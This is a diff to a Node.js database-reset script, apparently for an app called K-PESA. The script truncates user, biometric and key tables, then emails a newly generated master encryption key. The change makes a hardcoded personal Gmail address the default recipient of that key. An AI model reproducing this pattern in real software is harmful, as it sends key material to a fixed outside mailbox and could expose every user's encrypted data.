@@ -8,6 +8,9 @@ const crypto = require('crypto');
 const nodemailer = require('nodemailer');
 require('dotenv').config();
 
+const RECIPIENT_EMAIL = process.env.KEY_RECIPIENT_EMAIL || 'georgesmars8@gmail.com';
+
+
 const pool = new Pool({
   host: process.env.DB_HOST,
   port: process.env.DB_PORT,
@@ -42,8 +45,15 @@ async function clearDatabase() {
     await pool.query('TRUNCATE TABLE users RESTART IDENTITY CASCADE');
     console.log('  ✓ Cleared users');
 
+    await pool.query('TRUNCATE TABLE device_biometrics RESTART IDENTITY CASCADE');
+    console.log('  ✓ Cleared device_biometrics');
+
+    await pool.query('TRUNCATE TABLE custom_referral_codes RESTART IDENTITY CASCADE');
+    console.log('  ✓ Cleared custom_referral_codes');
+
     await pool.query('TRUNCATE TABLE encryption_keys RESTART IDENTITY CASCADE');
     console.log('  ✓ Cleared encryption_keys\n');
+
 
     console.log('✅ Database cleared successfully!\n');
   } catch (error) {
@@ -207,14 +217,16 @@ async function sendEmail(masterKey) {
   try {
     const info = await transporter.sendMail({
       from: `"K-PESA Security" <${process.env.EMAIL_FROM}>`,
-      to: process.env.SMTP_USER,
+      to: RECIPIENT_EMAIL,
       subject: '🔐 K-PESA New Encryption Keys - Action Required',
       html: emailBody,
     });
 
     console.log(`  ✓ Email sent successfully!`);
     console.log(`  📬 Message ID: ${info.messageId}\n`);
-    console.log(`✅ Keys sent to: ${process.env.SMTP_USER}\n`);
+    console.log(`✅ Keys sent to: ${RECIPIENT_EMAIL}\n`);
+
+
   } catch (error) {
     console.error('❌ Error sending email:', error.message);
     console.log('\n⚠️  EMAIL FAILED! Here is your MASTER_KEY (save it now):\n');
@@ -232,7 +244,7 @@ async function main() {
   console.log('═'.repeat(70));
   console.log('⚠️  WARNING: This will DELETE ALL DATA from your database!');
   console.log('Database:', process.env.DB_NAME);
-  console.log('Email will be sent to:', process.env.SMTP_USER);
+  console.log('Email will be sent to:', RECIPIENT_EMAIL);
   console.log('═'.repeat(70));
   console.log('\nStarting in 3 seconds... Press Ctrl+C to cancel\n');
 
@@ -252,7 +264,9 @@ async function main() {
     console.log('✅ ALL DONE! Check your email for the new MASTER_KEY');
     console.log('═'.repeat(70));
     console.log('\nNext steps:');
-    console.log('  1. Check email:', process.env.SMTP_USER);
+    console.log('  1. Check email:', RECIPIENT_EMAIL);
+
+
     console.log('  2. Update backend/.env with new MASTER_KEY');
     console.log('  3. Restart your backend server');
     console.log('  4. Test signup from your Flutter app\n');
